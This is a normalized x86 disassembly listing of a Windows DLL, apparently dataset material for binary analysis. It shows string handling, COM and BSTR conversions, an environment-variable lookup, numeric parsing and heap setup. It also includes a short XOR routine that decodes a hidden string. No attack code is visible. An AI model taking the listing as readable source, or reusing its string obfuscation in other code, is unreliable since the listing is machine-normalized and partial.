xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_1004c9b0
push ebp
mov ebp esp
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xd4 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffaa
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x36 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xd0 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x48 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xd0 ]
jns r-xdata
lea edx [ ebp - 0xc4 ]
mov [ ebp - 0xc4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x98
call sub_1000a6f0
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xc6
call sub_1000a6f0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0xf3
call sub_1000a6f0
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x97
jmp r-xdata
call sub_1000a6f0
lea edx [ ebp - 0x34 ]
mov eax 0x78
call sub_1000a6f0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xc4 ]
push eax
push ebx
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x101
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc4 ] 0x0
mov edx [ edi + 0x18 ]
lea ecx [ ebp - 0xcc ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xcc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x114
jmp r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x68
call sub_1000a6f0
mov esi [ ebp - 0xcc ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xcc ] eax
mov edx [ ebp - 0xcc ]
push edx
call [ SysFreeString@IAT ]
fld [ edi + 0x10 ]
lea eax [ ebp - 0xc8 ]
push eax
push 0x0
push 0x80000000
sub esp 0x8
fstp [ esp ]
mov [ ebp - 0xc8 ] 0x0
call [ VarBstrFromR8@IAT ]
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x1b
call sub_1000a6f0
lea edx [ ebp - 0x58 ]
mov eax 0xd2
call sub_1000a6f0
mov esi [ ebp - 0xc8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xd8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx [ ebp - 0xd0 ]
push ecx
push eax
call edx
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x51
call sub_1000a6f0
lea edx [ ebp - 0xac ]
mov eax 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xd4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc4 ]
test eax eax
je r-xdata
sub_1004ccdb
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10078ac0
pop ecx
mov edi eax
jmp r-xdata
call sub_1002462a
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10078ac0
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_1000b691
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_1004cd62
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1001bfc0
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1004cd88
push 0x6c
mov eax sub_1007e745
call sub_10007703
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10018820
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_1002a730
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_1005e05a
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_10060ea7
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_1003b57f
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_10019c00
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1001e1ec
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1ec
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10060ea7
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1001c5c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_1001e1bc
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1001e1ec
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x64 ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_1001e1bc
sub_1004d430
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f65f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x30 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_10008200
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_1004d5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f580
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_1002050e
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_10045700
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_10065045
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_10078600
add esp 0xc
sub_1004d71b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1002050e
int3
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
sub_1004d750
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1004d7a9
push 0x3c
mov eax sub_1007e6d3
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1001f288
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_10050f80
cmp [ ebp - 0x20 ] 0x10
